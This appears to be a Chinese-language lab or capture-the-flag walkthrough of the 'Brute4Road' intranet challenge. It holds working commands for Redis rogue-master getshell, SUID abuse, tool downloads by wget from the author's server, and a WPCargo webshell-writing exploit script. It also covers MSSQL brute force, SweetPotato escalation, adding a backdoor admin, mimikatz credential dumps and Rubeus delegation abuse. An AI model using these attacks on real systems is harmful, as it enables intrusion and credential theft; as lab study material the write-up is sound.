# Brute4Road

进来没有信息先用fscan扫

![3144128-20231210214918827-364784034](D:\Pictures\Screenshots\3144128-20231210214918827-364784034.png)

是个redis未授权，尝试用**主从复制getshell**

使用redis-rogue-getshell-master

```
python3 redis-master.py -r 39.99.239.173 -p 6379 -L 47.109.157.54 -P 8888 -f RedisModulesSDK/exp.so -c "whoami"
```

成功执行

尝试读取flag

```
cat /home/redis/flag/flag01
```

发现没有返回内容，应该时权限不够

尝试suid提权

```
find / -user root -perm -4000 -print 2>/dev/null 
```

![3144128-20231210214922204-1695010852](D:\Pictures\Screenshots\3144128-20231210214922204-1695010852.png)

进行**base64提权**

```
base64 "/home/redis/flag/flag01" | base64 --decode
```

获取到flag01

---------------------------------

在vps起一个http服务来传工具

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简易 HTTP 文件服务器
用于渗透测试中快速共享本地文件（如 payload、工具等）
"""

import http.server
import socketserver
import os
import sys
import argparse

def start_server(bind_ip, port, directory):
    # 切换到指定目录
    if not os.path.isdir(directory):
        print(f"[!] 错误：目录 '{directory}' 不存在！")
        sys.exit(1)
    os.chdir(directory)
    print(f"[+] 已切换到目录: {os.getcwd()}")

    # 创建 HTTP 请求处理器
    Handler = http.server.SimpleHTTPRequestHandler

    try:
        with socketserver.TCPServer((bind_ip, port), Handler) as httpd:
            print(f"[+] HTTP 服务器启动成功！")
            print(f"    监听地址: http://{bind_ip}:{port}/")
            print(f"    共享目录: {directory}")
            print(f"    按 Ctrl+C 停止服务\n")
            httpd.serve_forever()
    except PermissionError:
        print(f"[!] 权限错误：无法绑定到端口 {port}（尝试使用 >1024 的端口，或用 sudo）")
        sys.exit(1)
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"[!] 端口 {port} 已被占用，请换一个端口")
        else:
            print(f"[!] 启动失败: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="启动一个简易 HTTP 文件服务器")
    parser.add_argument("-i", "--ip", default="0.0.0.0", help="绑定 IP 地址（默认 0.0.0.0）")
    parser.add_argument("-p", "--port", type=int, default=8000, help="监听端口（默认 8000）")
    parser.add_argument("-d", "--dir", default=".", help="要共享的目录（默认当前目录）")

    args = parser.parse_args()

    start_server(args.ip, args.port, os.path.abspath(args.dir))
```

将要传递的文件放在http-server.py同一文件夹里

使用**wget**获取fscan，frpc,frpc.ini

```
python3 redis-master.py -r 39.99.239.173 -p 6379 -L 47.109.157.54 -P 8888 -f RedisModulesSDK/exp.so -c "wget http://47.109.157.54:8000/frpc.ini"
```

执行命令赋予权限

```
chmod 777 fscan  ...
```

使用ifconfig无法查看网段

使用**netstat -ano**查看   发现已通信的内网 IP（辅助判断其他网段）

![3144128-20231210214923631-1523724988](D:\Pictures\Screenshots\3144128-20231210214923631-1523724988.png)

扫描结果

```none
./fscan -h 172.22.2.0/24

___                              _

  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.3
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.7      is alive		1
(icmp) Target 172.22.2.34     is alive
(icmp) Target 172.22.2.16     is alive
(icmp) Target 172.22.2.18     is alive		1
[*] Icmp alive hosts len is: 5
172.22.2.3:135 open
172.22.2.3:88 open
172.22.2.16:80 open
172.22.2.18:80 open
172.22.2.16:445 open
172.22.2.18:22 open
172.22.2.7:80 open
172.22.2.7:22 open
172.22.2.7:21 open
172.22.2.7:6379 open
172.22.2.34:445 open
172.22.2.34:7680 open
172.22.2.16:1433 open
172.22.2.3:445 open
172.22.2.16:139 open
172.22.2.18:445 open
172.22.2.34:139 open
172.22.2.18:139 open
172.22.2.3:139 open
172.22.2.34:135 open
172.22.2.16:135 open
[*] alive ports len is: 21
start vulscan
[*] NetInfo 
[*]172.22.2.3
   [->]DC
   [->]172.22.2.3
[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found
[*] NetInfo 
[*]172.22.2.34
   [->]CLIENT01
   [->]172.22.2.34
[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
[*] NetInfo 
[*]172.22.2.16
   [->]MSSQLSERVER
   [->]172.22.2.16
[*] OsInfo 172.22.2.16	(Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        
[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
[*] OsInfo 172.22.2.3	(Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.2.34     XIAORANG\CLIENT01             
[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
[+] ftp 172.22.2.7:21:anonymous 
   [->]pub
[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
已完成 21/21
```

内网主机

```
172.22.2.3 DC
172.22.2.7  本机 
172.22.2.16 MSSQLSERVER
172.22.2.18  WordPress站点
172.22.2.34  XIAORANG\CLIENT01
```

可以挂上代理走内网了

因为有wordpress站点，用kali中的wpscan扫一下

```
wpscan --url http://172.22.2.18 2>/dev/null
```

扫出来使用了wpcargo

利用脚本

```
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://172.22.2.18/'
cmd = 'ls'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))
```

蚁剑连接

记得选CMDLINUX

![image-20251210161252689](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251210161252689.png)

没找到flag但是有数据库配置文件泄露，找到了数据库的账号密码

在蚁剑中选择数据操作

![65ec0705894bc8fdadb2e02863d46f43](D:\Pictures\Screenshots\65ec0705894bc8fdadb2e02863d46f43.png)

找到flag和一些密码![fb1b0d7cef70d47e39a09442a7c80777](D:\Pictures\Screenshots\fb1b0d7cef70d47e39a09442a7c80777.png)

---------------------------------

将密码导入到记事本中，开始扫出来有mssql，用弱口令工具进行爆破![97c7da60445ad768d5cab2fa2c2f8504](D:\Pictures\Screenshots\97c7da60445ad768d5cab2fa2c2f8504.png)

用MDUT连接，在左上角记得激活组件

whoami发现现在不是system权限

查看提权条件whoami /priv，用甜土豆提权

![f9ec68c7678c50be1528ef3e2802dc20](D:\Pictures\Screenshots\f9ec68c7678c50be1528ef3e2802dc20.png)

C:/Users/Public/SweetPotato.exe -a "whoami"

添加新用户至管理员组

```
net user fisher fisher666 /add
net localgroup administrators fisher /add
```

然后就可以远程桌面连接了![1f08789c6bff8ac25836fb0a8cef1db7](D:\Pictures\Screenshots\1f08789c6bff8ac25836fb0a8cef1db7.png)

可以找到flag

----------------------------------

systeminfo查看域环境

![3144128-20231210214937227-2065038240](D:\Pictures\Screenshots\3144128-20231210214937227-2065038240.png)

管理员打开mimikatz.exe 

```
privilege::debug 
sekurlsa::logonpasswords full
```

抓取到域用户的hash

```none
Authentication Id : 0 ; 92869 (00000000:00016ac5)
Session           : Service from 0
User Name         : MsDtsServer130
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2023/12/10 16:01:00
SID               : S-1-5-80-3763098489-2620711134-3767674660-4164406483-1621732
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : f8f133bb3214e09e40a51e6606a0773d
         * SHA1     : 8d17ff73c15eff336dd43f9a0393e52da871ab7a
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : 61 cb 6a 2d a4 2d 02 83 7e ac 98 f3 08 97 5e 0d bb b8 7b ba 67 98 44 be 18 ad ec f8 9b 37 bd d5 83 bc 39 9a 04 50 cc a2 25 7d 7a 42 1d 29 37 8f cd 0d 6e 8b 85 b4 12 c9 ad 0a 51 f2 c9 db 7f e7 4d c9 7d f5 f5 2d c2 1d bc bb a8 b8 d5 2c 9d 31 c8 6b 60 6c 0a a1 56 6e 2c f2 79 0a a0 b0 d6 33 cd ec 37 53 c5 fb 87 5b ed c0 fe f5 9e 97 b7 98 0b 31 0c 42 81 5d 28 d0 95 ef 8d 94 ee 3f 0a 34 e8 64 36 98 eb ab 3f e2 50 53 82 04 00 a2 7e 20 be 68 eb d5 50 8b 5f ed 26 f7 60 4c 0a c7 bf 31 d1 c4 15 c2 84 56 2d 2c 9c 2a 35 1f 28 1a fc de b2 10 44 13 94 84 91 6f 1b e8 a4 e1 5e 35 d9 84 38 7b 9d 4a 49 ef 8a f0 50 f2 30 9d 7c 86 49 e1 2f ea 1a 83 4a 52 c7 c0 15 79 cf 7a f9 0b 08 a0 36 d0 3e 8f ee f4 7f 49 fd 40 f8 53 68 df 03 62
        ssp :
        credman :
```

这里尝试委派攻击。

这里先用域服务账号请求一个TGT

```shell
.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f8f133bb3214e09e40a51e6606a0773d /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > 1.txt
```

![image-20231210174440871](https://img2023.cnblogs.com/blog/3144128/202312/3144128-20231210214939551-1460720374.png)

将票据注入内存：

```shell
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3mqT2HLKODSL5gTZGEOj875RcDvOA6sFDvnzBxCPBkjgmE2+YHrdS4LFecFsizumMu44zCJHdTmNJMgn7/jmRdvHDZVRmjPCwhUeVykTfr7uZZIRjNZ7glF+15f+w2xs2LJC/OTkMW7prs7o/naKMSKKVAoAf2JVhOhotTX44Vku9kbl3ZirquGXaO5jekCUJx9hYEwspAKtL1C+hhHb1TNGGO460HBpP7ZrhvVPjkoSv/7+RJMm0OlAuv2tVANu9vnEy7MYBSSX3i3OBO5hxlkjF9aygQmMArjZWwtqQYULOmIflvlUimSW0OwXAjcURcFJgu6vJHTmKhl4ealC6Gy0or9+P53d+LSGRt15AGleRnPljwIyFTLGpQNl2S24X2xB2OTFPBafHPjmeg8AjEJi47MjanJBZrANhvCsHt4nnuhD2PAILpAHZjRnmrS7TgM5QSREcijt7yTUfDDGaO9Siuc8g2y5IDpM+jHmzn+kRD9XH285aethCqxU0kJ6Tyy/i/B6TK50RJ8QxMrFso5rUlGSp4hYxGEO87EgIZcmk6AE13vp8rNqoeh1flfNbyNj8dzCNEfpfitbMIQUJzQRoZaFxn51YZNG8AwTbcHFvBCh7PtMi5KUmqk2FvuRPT1KuiiUVj2RDShKQzgINIQkcG7is505dOb+kzp7R1pH2+sf5fDgzlbmVwxaC3ueJ+Emi+AevLYZd9hidWVuO+kUp6vCUuXo7pE+aq3UsMDt9Ary206NzlxmJElTqktpB/HBzub12QgAK10Qyn/9bPUANAIDE8+P0jB1gcRSZErZ78vT7QBpd2Ua2kkrsOFqH73x424d+B3VxsnM9cQldMdpAXS5Zk5IakAJIwv5KjNYzTmBWlbCEjAInmeVYJomOa4iH8DNJZZXGYRNN22DnkQAepPcyQCHXmVaTac4Pre1TuIIntKN4k5EORhO9zgCfS54/QiiSMXL9EbxPqN/09y68IQE8AaB0wrXfptLkq2NxvNSs8IGv9Tm4LL/d62cnmgUSYlX4s8P5vyQ0vhO0JIYLkKmJjOFHZ3i0safyO21oqt5rf59XRcHOQBMciW/4bnRWzuIZ2aQD9AIM69FXUCTrju5YgfbHtMKy8ZUuA7IQRQ+IxjqzCMRc8Igsxz7ks1jA7B5AdWPly0sa6V3sR/KMfIqJ8vHCMdPeq+BdgEpfPqKExEku827QeP5LtoFawN9uNv4rq/FgeOCxyF/7Snqr8czJYAIXc5YufxiTED67e8s4i9L9q37imtrCeCrEQM1gHAG4yZAZiwbnxwx7lRBVjx0eG8hcaQNOwAivEuAGJhhVMbeBHIb7a+sYrJMdQhTEQM1HednyTxjRnvEnTJgi4v0z/q169fMnXZ+SO9gR+ykNHNlNgJGacHDJ7M0W8yxQCvdR2Mb/1zupi8MJ2gU7YJ13nmAdrORGtFbUyivTSoe0DVeYLI/stK7ajgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBB9EbE3qUL80WOcIHVo5lCboQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMTIxMDA5NDQyMFqmERgPMjAyMzEyMTAxOTQ0MjBapxEYDzIwMjMxMjE3MDk0NDIwWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
```

之后执行即可看到flag

```shell
type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
```